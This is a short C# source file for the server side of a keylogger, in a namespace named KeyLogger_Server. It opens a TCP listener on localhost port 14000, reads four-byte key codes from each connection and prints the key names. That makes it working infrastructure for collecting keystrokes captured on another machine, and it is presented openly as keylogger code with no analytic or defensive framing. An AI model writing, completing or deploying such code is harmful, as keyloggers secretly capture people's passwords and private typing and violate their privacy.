using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger_Server
{
    static public class Listener
    {
        static Socket Lis_sock;
        static Thread Lis_Thread;
        static public void Start()
        {
            Lis_sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                Lis_sock.Bind(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 14000));
                Lis_sock.Listen(5);
                ThreadStart threadStart = new ThreadStart(Listen);
                Lis_Thread = new Thread(threadStart);
                Lis_Thread.Start();
            }
            catch(Exception Ex)
            {
                Console.WriteLine(Ex.StackTrace);
            }
        }
        static void Listen()
        {
            try
            {
                while(true)
                {
                    Socket Acc_sock = Lis_sock.Accept();
                    byte[] KeyByte = new byte[4];
                    Acc_sock.Receive(KeyByte);
                    Console.WriteLine(((Keys)BitConverter.ToInt32(KeyByte,0)).ToString());
                    Acc_sock.Close();
                }
            }
            catch(Exception Ex)
            {
                Console.WriteLine(Ex.StackTrace);
            }
        }
    }
}
